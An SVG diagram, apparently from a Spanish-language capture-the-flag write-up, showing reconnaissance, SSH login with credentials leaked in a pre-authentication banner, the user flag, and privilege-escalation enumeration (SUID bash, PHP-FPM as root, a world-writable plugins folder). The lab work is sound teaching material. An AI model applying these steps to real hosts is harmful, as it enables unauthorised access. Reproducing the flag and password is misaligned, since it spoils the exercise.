@@ -1,0 +1,75 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1240 566" width="1240" height="566">
+  <style>
+    .bg{fill:#0b1120}.panel{fill:#1e293b;stroke:#334155}
+    .term{fill:#020617;stroke:#334155}
+    .ttl{fill:#f8fafc;font:700 23px 'Segoe UI',system-ui,sans-serif}
+    .sub{fill:#94a3b8;font:400 13px 'Segoe UI',system-ui,sans-serif}
+    .by{fill:#64748b;font:400 11.5px 'Segoe UI',system-ui,sans-serif}.byn{fill:#38bdf8;font:700 11.5px 'Segoe UI',system-ui,sans-serif}
+    .h{fill:#f8fafc;font:700 13px 'Segoe UI',system-ui,sans-serif}
+    .cmd{fill:#38bdf8;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .out{fill:#94a3b8;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .ok{fill:#22c55e;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .bad{fill:#ef4444;font:700 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .warn{fill:#f59e0b;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .note{fill:#94a3b8;font:400 11.5px 'Segoe UI',system-ui,sans-serif}
+  </style>
+  <rect class="bg" width="1240" height="566"/>
+  <text class="ttl" x="20" y="38">Fases 1–4 — Reconocimiento, acceso y enumeración</text>
+  <text class="sub" x="20" y="60">Los comandos ejecutados, con su salida real</text>
+
+  <!-- FASE 1 -->
+  <rect class="panel" x="20" y="86" width="380" height="196" rx="10"/>
+  <text class="h" x="36" y="110">Fase 1 · Reconocimiento</text>
+  <text class="cmd" x="36" y="134">$ nmap -p- -sV -sC -sT -n -Pn 172.17.0.2</text>
+  <text class="out" x="36" y="156">22/tcp  open  ssh   OpenSSH 8.9p1 Ubuntu</text>
+  <text class="out" x="36" y="174">80/tcp  open  http  Apache/2.4.52 (Ubuntu)</text>
+  <text class="warn" x="36" y="196">|_http-title: ACME Corporation —</text>
+  <text class="warn" x="36" y="212">           Portal en Mantenimiento</text>
+  <text class="warn" x="36" y="234">|_/migration_notes.txt   (robots.txt)</text>
+  <text class="note" x="36" y="256">La nota remite a SSH como vía de acceso.</text>
+  <text class="note" x="36" y="272" fill="#f59e0b">Solo 2 de 65535 puertos visibles desde fuera.</text>
+
+  <!-- FASE 2 -->
+  <rect class="panel" x="416" y="86" width="804" height="196" rx="10" stroke="#ef4444" stroke-width="2"/>
+  <text class="h" x="432" y="110" fill="#ef4444">Fase 2 · Credenciales filtradas en el banner SSH (pre-autenticación)</text>
+  <text class="cmd" x="432" y="132">$ ssh usuario@172.17.0.2   →  el banner se imprime ANTES de solicitar contraseña</text>
+  <rect class="term" x="432" y="144" width="772" height="110" rx="7" stroke="#7f1d1d"/>
+  <text class="out" x="446" y="166">[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno</text>
+  <text class="warn" x="446" y="186">[!] Credenciales temporales asignadas para tareas de mantenimiento:</text>
+  <text class="bad" x="446" y="208">[!]   - Usuario: usuario</text>
+  <text class="bad" x="446" y="228">[!]   - Password: P@ssw0rd2026_CTF!</text>
+  <text class="note" x="432" y="272">El servidor entrega las credenciales a cualquier cliente que abra el puerto 22.</text>
+
+  <!-- FASE 3 -->
+  <rect class="panel" x="20" y="282" width="380" height="264" rx="10" stroke="#14532d" stroke-width="2"/>
+  <text class="h" x="36" y="306" fill="#22c55e">Fase 3 · Bandera de usuario</text>
+  <text class="cmd" x="36" y="330">$ sshpass -p '...' ssh usuario@172.17.0.2</text>
+  <text class="cmd" x="36" y="352">$ id</text>
+  <text class="out" x="36" y="372">uid=1000(usuario) gid=1000(usuario)</text>
+  <text class="out" x="36" y="388">groups=1000(usuario)</text>
+  <text class="cmd" x="36" y="418">$ cat /home/usuario/user.txt</text>
+  <text class="ok" x="36" y="440">FLAG{nmap_recon_ssh_foothold</text>
+  <text class="ok" x="36" y="456">        _7a9f24e1}</text>
+  <rect class="term" x="36" y="472" width="348" height="58" rx="7"/>
+  <text class="note" x="48" y="492">Shell sin privilegios. groups contiene</text>
+  <text class="note" x="48" y="510">únicamente «usuario» → sin sudo.</text>
+
+  <!-- FASE 4 -->
+  <rect class="panel" x="416" y="282" width="804" height="264" rx="10" stroke="#ef4444" stroke-width="2"/>
+  <text class="h" x="432" y="306" fill="#ef4444">Fase 4 · Enumeración: tres hallazgos independientes</text>
+
+  <text class="cmd" x="432" y="332">$ find / -xdev -perm -4000 -type f 2&gt;/dev/null</text>
+  <text class="bad" x="452" y="350">→  /usr/bin/bash   -rwsr-xr-x root root    (VECTOR A: shell SUID)</text>
+
+  <text class="cmd" x="432" y="378">$ grep -vE '^\s*;|^\s*$' /etc/php/8.1/fpm/pool.d/www.conf</text>
+  <text class="bad" x="452" y="396">→  user = root   /   group = root       (VECTOR B: PHP-FPM como root)</text>
+
+  <text class="cmd" x="432" y="424">$ ls -la /var/www/wordpress/wp-content/plugins/</text>
+  <text class="bad" x="452" y="442">→  drwxrwxrwx   permisos 777, escritura por cualquier usuario</text>
+
+  <text class="cmd" x="432" y="470">$ grep -rh DocumentRoot /etc/apache2/sites-available/</text>
+  <text class="warn" x="452" y="488">→  /var/www/maintenance (:80)   ·   /var/www/wordpress (127.0.0.1:8080)</text>
+
+  <text class="cmd" x="432" y="516">$ ss -tlnp | grep -E '8080|9000'</text>
+  <text class="warn" x="452" y="534">→  servicios internos solo en loopback, alcanzables desde la sesión</text>
+</svg>
